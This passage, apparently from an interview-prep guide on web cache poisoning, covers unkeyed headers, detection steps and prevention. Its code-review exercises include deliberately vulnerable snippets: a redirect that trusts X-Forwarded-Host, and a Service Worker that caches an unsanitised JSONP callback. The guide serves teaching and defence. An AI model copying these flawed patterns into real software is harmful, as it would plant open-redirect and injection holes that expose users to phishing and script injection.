5. **Why is X-Forwarded-Host a common cache poisoning vector?**
   - Often reflected in responses (redirects, canonical links)
   - Rarely included in cache key
   - Trusted by backend without validation

### Scenario-Based Questions

6. **You discover your CDN is caching private user data. What do you do?**
   ```
   1. Purge affected cache entries immediately
   2. Set Cache-Control: private, no-store
   3. Identify root cause (cache config vs code bug)
   4. Monitor for similar issues
   5. Document incident
   ```

7. **Design a caching strategy that prevents cache poisoning.**
   ```javascript
   // 1. Separate caches by content type
   // 2. Include all reflected headers in cache key
   // 3. Validate all inputs
   // 4. Use Vary header
   // 5. Set appropriate Cache-Control
   ```

8. **How would you test a website for cache poisoning vulnerabilities?**
   ```
   1. Identify cacheable endpoints
   2. Test unkeyed headers (X-Forwarded-*, X-Original-URL)
   3. Check if reflected in response
   4. Verify caching behavior (X-Cache header)
   5. Confirm cache key composition
   ```

### Code Review Questions

9. **Find the vulnerability:**
   ```javascript
   app.get('/redirect', (req, res) => {
     const host = req.headers['x-forwarded-host'] || req.headers.host;
     res.redirect(`https://${host}/login`);
   });
   ```
   **Answer**: Unvalidated X-Forwarded-Host → Open redirect → Cached → Phishing

10. **Fix this Service Worker:**
    ```javascript
    // Vulnerable
    self.addEventListener('fetch', (event) => {
      const url = new URL(event.request.url);
      const callback = url.searchParams.get('callback');
      
      const response = new Response(`${callback}(data)`, {
        headers: { 'Content-Type': 'application/javascript' }
      });
      
      event.respondWith(
        caches.open('v1').then(cache => {
          cache.put(event.request, response.clone());
          return response;
        })
      );
    });
    ```
    **Fix**: Validate callback, sanitize input, use separate cache key

---

## Summary

### Key Takeaways

```
┌─────────────────────────────────────────────────────────────┐
│              CACHE POISONING - KEY POINTS                    │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  1. AMPLIFICATION                                           │
│     One poisoned cache entry affects ALL users              │
│                                                              │
│  2. ROOT CAUSE                                              │
│     Unkeyed inputs reflected in cached responses            │
│                                                              │
│  3. COMMON VECTORS                                          │
│     • X-Forwarded-Host, X-Original-URL                      │
│     • CORS misconfig (Origin reflection)                    │
│     • Path confusion                                        │
│     • Service Worker cache manipulation                     │
│                                                              │
│  4. PREVENTION                                              │
│     • Include reflected headers in cache key                │
│     • Validate all inputs (whitelist approach)              │
│     • Use Cache-Control: private for sensitive data         │
│     • Implement CSP                                         │
│     • Set Vary header correctly                             │
│                                                              │
│  5. DETECTION                                               │
│     • Monitor suspicious header patterns                    │
│     • Test unkeyed inputs                                   │
│     • Regular security audits                               │
│                                                              │
│  6. INCIDENT RESPONSE                                       │
│     • Purge poisoned cache immediately                      │
│     • Fix vulnerability                                     │
│     • Update cache configuration                            │
│     • Monitor for recurrence                                │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### Essential Knowledge for Interviews

- **Definition**: Exploiting cache key vs origin server input mismatch
- **Impact**: Millions affected by single attack
- **Examples**: Cloudflare CDN, PayPal web cache deception
- **Prevention**: Validate inputs, proper cache configuration, CSP
- **Detection**: Test unkeyed headers, monitor suspicious patterns

---

## References

- [PortSwigger: Web Cache Poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [Cloudflare: Cache Poisoning](https://www.cloudflare.com/learning/security/threats/cache-poisoning/)
- [OWASP: Cache Poisoning](https://owasp.org/www-community/attacks/Cache_Poisoning)
- [Practical Web Cache Poisoning (James Kettle)](https://portswigger.net/research/practical-web-cache-poisoning)

---

**Document Status**: Production Ready ✅  
**Last Updated**: January 2026  
**Difficulty Level**: Advanced  
**Interview Relevance**: 🔥🔥🔥🔥 (Senior+)

Cache poisoning is a high-impact vulnerability that senior+ engineers must understand. It demonstrates knowledge of:
- Security fundamentals
- Caching architectures
- CDN configuration
- Incident response
- Production mindset

Master this topic for **staff-level interviews**! 🛡️
